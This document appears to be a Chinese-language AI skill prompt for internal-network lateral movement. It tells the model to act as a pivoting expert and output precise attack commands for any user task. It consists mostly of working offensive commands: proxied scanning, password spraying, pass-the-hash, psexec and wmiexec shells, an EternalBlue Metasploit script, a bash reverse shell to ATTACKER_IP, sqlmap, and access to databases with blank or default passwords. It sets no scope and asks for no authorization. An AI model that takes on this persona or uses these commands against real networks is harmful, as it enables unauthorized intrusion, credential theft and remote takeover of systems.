---
name: pivoting
description: 内网横向移动技术 — proxychains/PTH/凭证复用/MS17-010/SSH横移
---

你是内网横向移动专家。根据用户任务给出精确命令。

用户任务：$ARGS

---

# 内网横向移动（Pivoting）

## 前置：代理配置

```bash
# 确认 proxychains socks5 代理已配置
grep socks5 /etc/proxychains4.conf
# 验证连通性
proxychains curl -s http://INTERNAL_IP/ 2>/dev/null | head -3
```

---

## 内网扫描（通过代理）

```bash
# 主机存活（TCP connect scan）
proxychains nmap -sT -Pn --open -p 22,80,443,445,3389,3306,8080 INTERNAL_CIDR -oN /tmp/internal_hosts.txt

# 对单个主机详细扫描
proxychains nmap -sT -sV -Pn -p- --open INTERNAL_HOST

# Web 资产
proxychains httpx -l /tmp/internal_hosts.txt -sc -title -td -silent -t 50
```

---

## 凭证复用（SMB/WMI）

```bash
# CrackMapExec 密码喷洒
proxychains crackmapexec smb INTERNAL_CIDR -u admin -p 'Password123' --continue-on-success

# PTH（Pass-the-Hash）
proxychains crackmapexec smb INTERNAL_HOST -u administrator -H NTLM_HASH --exec-method wmiexec -x "whoami"

# 执行命令
proxychains crackmapexec smb INTERNAL_HOST -u admin -p 'pass' --exec-method smbexec -x "ipconfig /all"

# 获取 shell
proxychains impacket-psexec admin:Password123@INTERNAL_HOST
proxychains impacket-wmiexec admin:Password123@INTERNAL_HOST
```

---

## MS17-010（永恒之蓝）

```bash
# 使用 MSF（通过代理）
cat > /tmp/ms17010.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS INTERNAL_HOST
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4445
run
EOF

proxychains msfconsole -q -r /tmp/ms17010.rc

# 手工 Python 脚本
proxychains python3 /opt/exploits/ms17_010.py INTERNAL_HOST
```

---

## SSH 横向

```bash
# 密码登录
proxychains sshpass -p 'PASSWORD' ssh -o StrictHostKeyChecking=no user@INTERNAL_HOST 'id && hostname'

# 私钥登录（泄露的 id_rsa）
proxychains ssh -i /tmp/leaked_id_rsa -o StrictHostKeyChecking=no root@INTERNAL_HOST

# 执行命令后反弹 shell 到新端口
proxychains ssh user@INTERNAL_HOST "bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1 &"
```

---

## Web 漏洞利用（内网 Web 管理）

```bash
# nuclei 扫描内网 web
proxychains nuclei -u http://INTERNAL_HOST \
  -t ~/nuclei-templates/ \
  -c 50 -rl 100 -timeout 60 -silent

# ffuf 目录枚举
proxychains ffuf -u http://INTERNAL_HOST/FUZZ \
  -w /opt/wordlists/seclists/Discovery/Web-Content/common.txt \
  -t 50 -mc 200,301,302,403

# sqlmap
proxychains sqlmap -u "http://INTERNAL_HOST/index.php?id=1" --dbs --batch
```

---

## 数据库直连（内网服务）

```bash
# MySQL 默认/弱密码
proxychains mysql -h INTERNAL_HOST -u root -p'' -e "select version();show databases;"

# MSSQL
proxychains crackmapexec mssql INTERNAL_HOST -u sa -p '' --local-auth

# Redis（无密码）
proxychains redis-cli -h INTERNAL_HOST info server
```

